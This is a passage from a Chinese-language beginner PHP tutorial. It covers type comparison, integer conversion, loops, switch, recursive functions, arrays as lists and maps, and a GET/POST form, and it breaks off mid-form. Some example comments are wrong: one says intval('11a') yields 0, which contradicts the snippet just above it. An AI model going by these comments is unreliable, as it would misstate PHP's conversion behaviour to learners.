class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x = <span class="number">10</span>;</span><br><span class="line">$y = <span class="string">"10"</span>;</span><br><span class="line"></span><br><span class="line">var_dump($x); <span class="comment">// int(10)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">var_dump($y); <span class="comment">// string(2) "10"</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $x == $y;  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $x === $y; <span class="comment">// false 输出是空字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> ($x === $y) == <span class="keyword">false</span>;  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> ($x === $y) === <span class="keyword">false</span>; <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $x . <span class="string">" apples"</span>; <span class="comment">// 10 apples</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="数字与字符串比较"><a href="#数字与字符串比较" class="headerlink" title="数字与字符串比较"></a>数字与字符串比较</h2><p>数字与字符串比较时, <code>先尝试将字符串转换为数字</code>, 再比较, 一个不能转换为数字的字符串, 转换结果为0, 故, 与 0 比较总返回 true</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// String to integer</span></span><br><span class="line"><span class="comment">// 返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。</span></span><br><span class="line"><span class="comment">// 如果字符串第一个是‘-'，则从第二个开始算起</span></span><br><span class="line"><span class="keyword">echo</span> (int)(<span class="string">"a11"</span>); <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> (int)(<span class="string">"11a"</span>); <span class="comment">// 11</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">"a11"</span>); <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">"11a"</span>); <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">"11"</span>, <span class="number">2</span>); <span class="comment">// 3</span></span><br><span class="line"><span class="comment">// 这个函数后面的参数代表需要转化的数是几进制</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h2><p><code>if else</code> <code>for</code> <code>foreach</code> <code>while</code> <code>do while</code> <code>switch case</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// if else</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;If else&lt;br&gt;"</span>;</span><br><span class="line">$score = <span class="number">70</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($score &lt; <span class="number">60</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"小于 60 &lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($score &lt; <span class="number">80</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"大于等于 60，小于 80 &lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"大于 80 &lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// for: 输出 1 到 10</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;For&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= <span class="number">10</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$i&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// foreach: 输出数组中的所有元素</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// foreach 循环只适用于数组，并用于遍历数组中的每个键/值对。</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;Foreach&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$colors = <span class="keyword">array</span>(<span class="string">"Red"</span>, <span class="string">"Green"</span>, <span class="string">"Blue"</span>, <span class="string">"White"</span>, <span class="string">"Black"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($colors <span class="keyword">as</span> $color) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$color &lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// while: 输出 1 到 10</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;While&lt;br&gt;"</span>;</span><br><span class="line">$i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ($i++ &lt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$i&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// do while: 输出 1 到 10</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;Do while&lt;br&gt;"</span>;</span><br><span class="line">$i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$i&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (++$i &lt;= <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// switch: 可以使用字符串，数字等</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;Switch&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$condition = <span class="string">"A"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($condition) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Is 1 &lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"a"</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">"A"</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Is A &lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"B"</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Is B &lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Default &lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>PHP 内置了 1000 多个函数，功能很强大，例如要计算一个字符串的 MD5 并转换为大写 <code>strtoupper(md5(&quot;Tidy Code&quot;))</code> 得到 <code>ADCF1E98EBD0FD99E1227346B70BD9E2</code>。</p><p>函数创建和 JavaScript 很像，都是以关键字 <code>function</code> 开头，然后是<code>函数名</code>和<code>参数列表</code>，<code>参数支持默认值</code>，函数的定义和<code>调用顺序</code>没有要求，可以递归调用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> fibonacc(<span class="number">10</span>) . <span class="string">"&lt;br&gt;"</span>; <span class="comment">// 函数调用，输出：55</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 函数定义: 递归实现斐波那契数列</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fibonacc</span><span class="params">($n)</span> </span>&#123; <span class="comment">// 变量 $n 的作用域 是 local.</span></span><br><span class="line">    <span class="keyword">if</span> ($n == <span class="number">1</span> || $n == <span class="number">2</span>) &#123; <span class="comment">// 递归结束条件</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fibonacc($n - <span class="number">1</span>) + fibonacc($n - <span class="number">2</span>); <span class="comment">// 递归</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出：1, 1, 2, 3, 5, 8, 13, 21, 34, 55,</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= <span class="number">10</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> fibonacc($i) . <span class="string">", "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 默认参数只能在参数列表最后面，可以有多个默认参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">($name, $email = <span class="string">"xxxx@gmail.com"</span>, $mobile = <span class="string">"xxxxxxxxxxx"</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Name is: $name, EMail is: $email, Mobile is: $mobile &lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出：Name is: Alice, EMail is: alice@salmon.com, Mobile is: 12345678901</span></span><br><span class="line">foo(<span class="string">"Alice"</span>, <span class="string">"alice@salmon.com"</span>, <span class="string">"12345678901"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出：Name is: Alice, EMail is: alice@salmon.com, Mobile is: xxxxxxxxxxx</span></span><br><span class="line">foo(<span class="string">"Alice"</span>, <span class="string">"alice@salmon.com"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出：Name is: Alice, EMail is: xxxx@gmail.com, Mobile is: xxxxxxxxxxx</span></span><br><span class="line">foo(<span class="string">"Alice"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p><code>PHP 里的数组</code>实际上是一个字典 <code>Dictionary</code>，也可以叫 <code>Map</code>，就是用 <code>key/value</code> 的形式存储。没有给出 key 的时候 key 默认就是用下标 0，1，2 等。</p><p>数组用 <code>array()</code> 来创建，数组的长度用 <code>count()</code> 来计算。</p><blockquote><p>同一个 <code>array</code> 对象推荐单纯的作为<code>数组</code>使用，或者是 <code>Map</code> 使用。<br>不要既有数组的用法，同时也有 Map 的用法。</p></blockquote><h3 id="作为普通数组使用"><a href="#作为普通数组使用" class="headerlink" title="作为普通数组使用"></a><code>作为普通数组使用</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$colors = <span class="keyword">array</span>(<span class="string">"Red"</span>, <span class="string">"Green"</span>, <span class="string">"Blue"</span>); <span class="comment">// 定义数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 使用下标直接访问数组元素</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">$colors[<span class="number">0</span>] = <span class="string">"Yellow"</span>; <span class="comment">// 给数组赋元素值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$colors[0], $colors[1], $colors[2] &lt;br&gt;"</span>; <span class="comment">// 用下标访问数组的元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-------------------------------------------&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 使用 for 循环遍历数组</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">$len = count($colors);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $colors[$i];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-------------------------------------------&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 使用 foreach 循环遍历数组</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">foreach</span> ($colors <span class="keyword">as</span> $color) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $color;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 使用数组排序</span></span><br><span class="line">sort() <span class="comment">// 以升序对数组排序</span></span><br><span class="line">rsort() <span class="comment">// 以降序对数组排序</span></span><br><span class="line">asort() <span class="comment">// 根据值，以升序对关联数组进行排序</span></span><br><span class="line">ksort() <span class="comment">// 根据键，以升序对关联数组进行排序</span></span><br><span class="line">arsort() <span class="comment">// 根据值，以降序对关联数组进行排序</span></span><br><span class="line">krsort() <span class="comment">// 根据键，以降序对关联数组进行排序</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$numbers = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>);</span><br><span class="line">$len = count($numbers);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> join(<span class="string">", "</span>, $numbers) . <span class="string">"&lt;br&gt;"</span>; <span class="comment">// 输出数组元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择排序: 升序</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len - <span class="number">1</span>; $i++) &#123;</span><br><span class="line">    $k = $i;</span><br><span class="line">    <span class="keyword">for</span> ($j = $i; $j &lt; $len; $j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($numbers[$j] &lt; $numbers[$k]) &#123;</span><br><span class="line">            $k = $j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $temp = $numbers[$k];</span><br><span class="line">    $numbers[$k] = $numbers[$i];</span><br><span class="line">    $numbers[$i] = $temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> join(<span class="string">", "</span>, $numbers) . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="作为-Map-使用"><a href="#作为-Map-使用" class="headerlink" title="作为 Map 使用"></a><code>作为 Map 使用</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ages = <span class="keyword">array</span>(<span class="string">"Alice"</span>=&gt;<span class="string">"20"</span>, <span class="string">"Bob"</span>=&gt;<span class="string">"25"</span>, <span class="string">"Josh"</span>=&gt;<span class="string">"30"</span>); <span class="comment">// 创建 Map</span></span><br><span class="line"><span class="comment">// 另外一种声明方法</span></span><br><span class="line">$age[<span class="string">'Peter'</span>]=<span class="string">"35"</span>;</span><br><span class="line">$age[<span class="string">'Ben'</span>]=<span class="string">"37"</span>;</span><br><span class="line">$age[<span class="string">'Joe'</span>]=<span class="string">"43"</span>;</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 使用 key 访问 value，就像 Java 的 Map： map.getValue(key)</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">echo</span> $ages[<span class="string">"Alice"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-------------------------------------------&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 输出所有的 key 和 value.</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">foreach</span>($ages <span class="keyword">as</span> $key=&gt;$value) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Key: $key, Value: $value"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-------------------------------------------&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 输出所有的 value</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="keyword">foreach</span>($ages <span class="keyword">as</span> $value) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Value: $value"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="作为数组和-Map-混用，下标和-key-理解起来就比较混乱"><a href="#作为数组和-Map-混用，下标和-key-理解起来就比较混乱" class="headerlink" title="作为数组和 Map 混用，下标和 key 理解起来就比较混乱"></a>作为数组和 Map 混用，<code>下标</code>和 <code>key</code> 理解起来就比较混乱</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$colors = <span class="keyword">array</span>(<span class="string">"Red"</span>, <span class="string">"Green"</span>, <span class="string">"Blue"</span>); <span class="comment">// 下标是 0，1，2，实际应该理解为 key。</span></span><br><span class="line">$colors[<span class="number">5</span>] = <span class="string">"Yellow"</span>;</span><br><span class="line">$colors[<span class="number">6</span>] = <span class="string">"Purple"</span>;</span><br><span class="line">$colors[<span class="string">"pink"</span>] = <span class="string">"Pink"</span>; <span class="comment">// 第 5 个元素，但是不能用 $colors[5] 访问(是 Yellow)</span></span><br><span class="line"></span><br><span class="line">$len = count($colors);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; ++$i) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $i . <span class="string">"  "</span> . $colors[$i]; <span class="comment">// 下标 3，4 没有元素，所以输出 到 3，4 时会报错</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-------------------------------------------&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($colors <span class="keyword">as</span> $color) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $color;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"-------------------------------------------&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $colors[<span class="number">5</span>]; <span class="comment">// 数字为 key 时可以不用引号</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $colors[<span class="string">"5"</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="处理-GET-和-POST-请求"><a href="#处理-GET-和-POST-请求" class="headerlink" title="处理 GET 和 POST 请求"></a>处理 GET 和 POST 请求</h2><p>使用 <code>$_GET[&quot;fieldName&quot;]</code> 取得 get 请求的数据<br>使用 <code>$_POST[&quot;fieldName&quot;]</code> 取得 post 请求的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;form.php&quot; method&#x3D;&quot;GET&quot;&gt; &lt;!-- 换成 POST --&gt;</span><br><span class="line">        Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot;&gt;</span><br><span class="line">        Mail: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;mail&quot;&gt;</span><br><span 